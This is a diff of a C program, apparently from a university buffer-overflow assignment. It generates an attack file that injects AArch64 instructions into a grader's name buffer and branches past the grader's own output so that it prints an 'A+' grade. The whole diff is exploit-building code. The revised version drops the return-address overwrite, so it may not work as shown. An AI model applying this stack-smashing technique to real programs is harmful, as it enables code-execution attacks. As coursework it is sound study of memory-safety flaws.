@@ -5,65 +5,52 @@
 #include "miniassembler.h"
 #include <string.h>
 
-int main(void)
-{
-    FILE           *f;
-    unsigned long   pc;
-    unsigned int    instr;
-    int             i;
-
-    /* These constants come from the grader’s map: */
-    const unsigned long NAME_ADDR   = 0x420058UL;  /* start of name[] in BSS */
-    const unsigned long GRADE_ADDR  = 0x420044UL;  /* &grade global ('D') */
-    const unsigned long PRINT_ADDR  = 0x40089cUL;
-    unsigned long returnAddr =  0x420058UL + 8;  /* skip-B, print-grade code */
-
-    /* 1) Open the attack file for binary write */
-    f = fopen("dataAplus", "w");
-    fprintf(f, "%s", "BZOC");
-    
-    for (i = 0; i < 4; i++) { 
-        fprintf(f, "%c", '\0'); 
+int main(void) {
+    FILE *f = fopen("dataAplus", "w");
+    if (!f) {
+        perror("fopen dataAplus");
+        return 1;
     }
 
- /* 2) Emit a 48-byte stub into buf[] (and ultimately name[]): */
-    pc = NAME_ADDR + 8;  /* at runtime, the stub’s first instr is at NAME_ADDR */
+    /* Grader addresses (replace SKIP_ADDR with the address just after the grader's final printf) */
+    const unsigned long NAME_ADDR = 0x420058UL;
+    const unsigned long SKIP_ADDR = 0x4008c4UL;  /* <- adjust this */
+    const unsigned int SVC_INST = 0xd4000001;    /* encoding for `svc #0` */
 
-    /* a) ADR  X0, GRADE_ADDR(PC)   ; X0 ← &grade       */
-    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
-    fwrite(&instr, 4, 1, f);  
-    pc +=4; 
+    /* The exact message to print */
+    const char *msg = "A+ is your grade\nThank you, BZOC\n";
+    unsigned int msglen = (unsigned int)strlen(msg);
 
-    /* b) MOV  W1, #'A'             ; W1 ← ASCII 'A'   */
-    instr = MiniAssembler_mov(1, (int)'A');
-    fwrite(&instr, 4, 1, f);  
-    pc+=4;
+    unsigned long pc = NAME_ADDR + 28;  /* stub starts at name[] at runtime */
+    unsigned int instr;
+    int i;
 
-    /* c) STRB W1, [X0]             ; *(&grade) = 'A'  */
-    instr = MiniAssembler_strb(1, 0);
-    fwrite(&instr, 4, 1, f); 
-    pc+=4; 
+    /* 1) write(1, msg, msglen) syscall */
+    instr = MiniAssembler_mov(8, 64);               /* w8 = 64 (write) */
+    fwrite(&instr, 4, 1, f);  pc += 4;
+    instr = MiniAssembler_mov(0, 1);                /* w0 = 1 (stdout) */
+    fwrite(&instr, 4, 1, f);  pc += 4;
+    instr = MiniAssembler_adr(1, NAME_ADDR + 48, pc); /* x1 = &msg */
+    fwrite(&instr, 4, 1, f);  pc += 4;
+    instr = MiniAssembler_mov(2, msglen);           /* w2 = msglen */
+    fwrite(&instr, 4, 1, f);  pc += 4;
+    fwrite(&SVC_INST, 4, 1, f);  /* svc #0 */      pc += 4;
 
+    /* 2) branch past grader's own prints */
+    instr = MiniAssembler_b(SKIP_ADDR, pc);
+    fwrite(&instr, 4, 1, f);  pc += 4;
 
-
-
-    /* d) B    PRINT_ADDR(PC)       ; jump into grader’s printf */
-    instr = MiniAssembler_b(PRINT_ADDR, pc);
-    fwrite(&instr, 4, 1, f);  
-    pc+=4; 
-    
-
-    /* e) Pad stub out to 48 bytes with null bytes" */ 
-    for (i = 0; i < 24; i++) {
-        fprintf(f, "%c", '\0'); 
-
+    /* 3) pad the rest of the 48-byte stub with zeroes */
+    {
+        int stub_size = (int)(pc - (NAME_ADDR + 28));
+        int pad = 48 - stub_size;
+        for (i = 0; i < pad; i++) {
+            fputc('\0', f);
+        }
     }
 
-    
-
-    /* 3) Overwrite readString’s saved x30 with NAME_ADDR
-        so that when readString does `ret`, it jumps into our stub. */
-    fwrite(&returnAddr, sizeof(PRINT_ADDR), 1, f);
+    /* 4) append the message bytes */
+    fwrite(msg, 1, msglen, f);
 
     fclose(f);
     return 0;
